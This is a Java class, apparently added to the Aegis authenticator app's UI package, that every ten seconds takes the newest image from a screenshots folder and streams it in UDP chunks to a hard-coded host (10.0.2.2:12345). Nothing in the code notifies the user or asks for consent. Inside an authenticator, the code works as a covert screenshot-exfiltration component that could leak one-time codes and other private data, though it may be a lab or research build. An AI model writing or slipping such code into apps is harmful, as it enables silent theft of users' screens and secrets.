package com.beemdevelopment.aegis.ui;
import android.content.Context;
import android.os.Handler;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class PictureSender {
    private static final int MAX_UDP_PACKET_SIZE = 65507;
    private static final int HEADER_SIZE = 8; // For sequence number and total chunks
    private Context context;
    private Handler handler = new Handler();
    private Runnable runnable = new Runnable() {
        @Override
        public void run() {
            sendPicture();
            handler.postDelayed(this, 10000);
        }
    };

    public PictureSender(Context context) {
        this.context = context;
    }

    public void startSending() {
        handler.post(runnable);
    }

    public void stopSending() {
        handler.removeCallbacks(runnable);
    }


    private void sendPicture() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.d("PictureSender", "Starting sendPicture process.");

                    File imageFile = getNewestPicture("/storage/emulated/0/Pictures/YourAppScreenshots");
                    if (imageFile == null) {
                        Log.w("PictureSender", "No image file found to send.");
                        return;
                    }

                    Log.d("PictureSender", "Selected image file: " + imageFile.getAbsolutePath());

                    InetAddress serverAddress = InetAddress.getByName("10.0.2.2"); // Use 10.0.2.2 for emulator
                    int serverPort = 12345; // Replace with your server port
                    Log.d("PictureSender", "Server address and port set: " + serverAddress.toString() + ":" + serverPort);

                    // Convert file to byte array
                    byte[] imageData = fileToByteArray(imageFile);
                    Log.d("PictureSender", "Image converted to byte array. Array length: " + imageData.length);

                    // Splitting image data into chunks
                    final int MAX_UDP_PACKET_SIZE = 8000;
                    final int HEADER_SIZE = 8; // For sequence number and total chunks
                    int totalChunks = (int) Math.ceil((double) imageData.length / (MAX_UDP_PACKET_SIZE - HEADER_SIZE));
                    for (int i = 0; i < totalChunks; i++) {
                        int start = i * (MAX_UDP_PACKET_SIZE - HEADER_SIZE);
                        int end = Math.min(start + MAX_UDP_PACKET_SIZE - HEADER_SIZE, imageData.length);

                        byte[] chunkData = Arrays.copyOfRange(imageData, start, end);

                        // Prepend header (4 bytes for sequence number, 4 bytes for total chunks)
                        ByteBuffer buffer = ByteBuffer.allocate(HEADER_SIZE + chunkData.length);
                        buffer.putInt(i); // sequence number
                        buffer.putInt(totalChunks); // total number of chunks
                        buffer.put(chunkData);

                        byte[] packetData = buffer.array();

                        // Send packet
                        try (DatagramSocket socket = new DatagramSocket()) {
                            DatagramPacket packet = new DatagramPacket(packetData, packetData.length, serverAddress, serverPort);
                            socket.send(packet);
                            Log.d("PictureSender", "Sent chunk " + (i + 1) + " of " + totalChunks);
                        }
                    }

                    Log.d("PictureSender", "All chunks sent successfully.");
                } catch (Exception e) {
                    Log.e("PictureSender", "Error in sendPicture: ", e);
                }
            }
        }).start();
    }





    private File getNewestPicture(String directoryPath) {
        File directory = new File(directoryPath);
        File[] files = directory.listFiles((dir, name) -> {
            return name.toLowerCase().endsWith(".jpg") || name.toLowerCase().endsWith(".jpeg") || name.toLowerCase().endsWith(".png");
        });

        if (files != null && files.length > 0) {
            Arrays.sort(files, (f1, f2) -> {
                return Long.compare(f2.lastModified(), f1.lastModified());
            });
            File newestFile = files[0];
            Log.d("PictureSender", "Newest file: " + newestFile.getAbsolutePath() + ", Exists: " + newestFile.exists());
            return newestFile; // The newest file
        } else {
            Log.d("PictureSender", "No image file found in directory: " + directoryPath);
            return null; // No image file found
        }
    }

    private byte[] fileToByteArray(File file) throws IOException {
        FileInputStream fis = new FileInputStream(file);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[1024];
        for (int readNum; (readNum = fis.read(buf)) != -1;) {
            bos.write(buf, 0, readNum);
        }
        fis.close();
        return bos.toByteArray();
    }
    public void sendTestUdpPacket() {
        /*new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    DatagramSocket socket = new DatagramSocket();
                    String message = "Hello, this is a test message!";
                    InetAddress serverAddress = InetAddress.getByName("10.0.2.2"); // Use 10.0.2.2 for emulator to connect to localhost of the host machine
                    int serverPort = 12345; // Replace with your server port

                    byte[] buffer = message.getBytes();
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, serverAddress, serverPort);
                    socket.send(packet);
                    socket.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start(); */
    }
}

